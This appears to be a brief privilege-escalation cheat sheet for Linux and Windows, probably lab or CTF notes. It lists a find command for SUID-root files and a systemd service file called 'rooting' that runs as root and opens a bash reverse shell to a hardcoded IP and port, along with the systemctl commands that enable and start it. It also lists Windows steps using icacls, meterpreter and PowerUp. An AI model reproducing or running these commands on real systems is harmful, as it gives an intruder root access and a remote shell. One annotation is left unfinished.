# Linux PrivEsc
- `find / -user root -perm -4000 -exec ls -ldb {} \\;` Find files with suid for root user (File will be executed with )

```
[Unit]
Description=rooting

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.237.111/4445 0>&1'

[Install]
WantedBy=multi-user.target
```
- `systemctl enable /path/to/file.service` and `systemctl start /path/to/file.service`

windows file permissions
- `icacls`
- `load powershell` in meterpreter
- `. .\PowerUp.ps1`
- `invoke-allchecks`